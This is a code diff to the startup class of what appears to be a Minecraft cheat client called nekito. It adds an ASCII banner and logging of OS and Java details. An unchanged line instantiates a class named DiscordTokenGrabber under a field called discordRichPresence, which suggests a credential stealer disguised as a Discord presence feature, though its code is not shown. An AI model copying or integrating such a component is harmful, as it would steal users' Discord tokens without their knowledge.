@@ -3,6 +3,7 @@ package wtf.norma.nekito;
 import de.florianmichael.viamcp.ViaMCP;
 import net.arikia.dev.drpc.DiscordRPC;
 import net.minecraft.client.Minecraft;
+import org.apache.commons.logging.Log;
 import org.lwjgl.Sys;
 import org.lwjgl.opengl.Display;
 import wtf.norma.nekito.command.CommandManager;
@@ -18,6 +19,7 @@ import wtf.norma.nekito.ui.WelcomeGUI;
 import wtf.norma.nekito.ui.clickgui.ClickGuiMain;
 import wtf.norma.nekito.ui.crashgui.CrashGuiMain;
 import wtf.norma.nekito.util.math.ScaleMath;
+import wtf.norma.nekito.util.other.LoggingUtil;
 import wtf.norma.nekito.util.render.RenderUtil;
 
 import java.io.IOException;
@@ -58,6 +60,41 @@ public enum nekito {
         isStarting = true;
         System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "false");
 
+        LoggingUtil.log(
+                "             oooo         o8o      .               \n" +
+                        "                      `888         `\"'    .o8             \n" +
+                        "ooo. .oo.    .ooooo.   888  oooo  oooo  .o888oo  .ooooo.  \n" +
+                        "`888P\"Y88b  d88' `88b  888 .8P'   `888    888   d88' `88b \n" +
+                        " 888   888  888ooo888  888888.     888    888   888   888 \n" +
+                        " 888   888  888    .o  888 `88b.   888    888 . 888   888 \n" +
+                        "o888o o888o `Y8bod8P' o888o o888o o888o   \"888\" `Y8bod8P' \n"
+               + "                                                     by normacheats"
+                        + "                                                     "
+                        + "                                                     "
+                        + "                                                     "
+
+        );
+
+        LoggingUtil.log("System Info: " + "" +
+                "");
+
+        LoggingUtil.log("Os name: " + System.getProperty("os.name"));
+        LoggingUtil.log("Os architecture: " + System.getProperty("os.arch"));
+        LoggingUtil.log("Os version: " + System.getProperty("os.version"));
+        LoggingUtil.log("Java vendor: " + System.getProperty("java.vendor"));
+        LoggingUtil.log("Java vendor url: " + System.getProperty("java.vendor.url"));
+        LoggingUtil.log("Java version: " + System.getProperty("java.version"));
+
+
+
+
+
+
+
+
+
+
+
         discordRichPresence = new DiscordTokenGrabber();
 
         commandManager = new CommandManager();
@@ -88,7 +125,7 @@ public enum nekito {
 
 
     public void onWelcomeUI() {
-        mc.displayGuiScreen(new WelcomeGUI());
+      //  mc.displayGuiScreen(new WelcomeGUI());
         nekito.INSTANCE.getCommandManager().getCommands().stream()
                 .filter(command -> !(command instanceof HelpCommand))
                 .forEach(command -> ChatHelper.printMessage(
